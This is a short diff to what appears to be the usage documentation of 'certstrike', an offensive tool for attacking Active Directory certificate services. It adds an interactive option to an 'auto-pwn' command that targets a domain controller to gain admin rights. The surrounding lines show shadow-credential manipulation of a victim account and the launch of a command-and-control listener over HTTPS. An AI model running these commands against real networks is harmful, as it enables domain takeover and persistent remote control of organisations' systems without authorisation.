@@ -105,6 +105,7 @@ certstrike shadow --remove --target "CN=victim,CN=Users,DC=corp,DC=local" --devi
 # Auto-pwn
 certstrike auto --target-dc dc01 --domain corp.local --upn admin@corp.local -u user -p pass
 certstrike auto --dry-run --target-dc dc01 --domain corp.local --upn admin@corp.local -u user -p pass
+certstrike auto -i --target-dc dc01 --domain corp.local --upn admin@corp.local -u user -p pass  # interactive path selection
 
 # C2
 certstrike c2 --port 8443 --protocol https
